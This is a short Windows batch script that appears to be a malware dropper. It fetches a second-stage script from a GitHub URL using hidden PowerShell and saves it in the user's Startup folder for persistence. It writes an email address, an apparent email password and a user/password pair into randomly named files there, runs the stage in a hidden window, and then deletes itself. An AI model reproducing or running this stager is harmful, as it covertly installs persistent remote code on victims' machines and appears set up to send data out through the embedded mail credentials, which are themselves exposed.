@echo off

# Custom
SET email=blabla.97@internet.ru
SET emailp=NoShitSherlock1036!
SET user=test2
SET p=test2

SET stage_path="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
SET init_path=%cd%

powershell -windowstyle hidden -c "Invoke-WebRequest 'raw.githubusercontent.com/DomoKrch/experiments/main/sec_stage.cmd' -OutFile '%stage_path%/sec_stage.cmd'"

echo %email% > %stage_path%/7r6lYgoLlv.txt
echo %emailp% > %stage_path%/OWEeX45e3U.txt
echo %user% > %stage_path%/etgtYmwQUO.txt
echo %p% > %stage_path%/f4EWj29Hgq.txt


powershell -c "Start-Process -FilePath '%stage_path%\sec_stage.cmd' -WindowStyle Hidden"

cd %init_path%
DEL %0
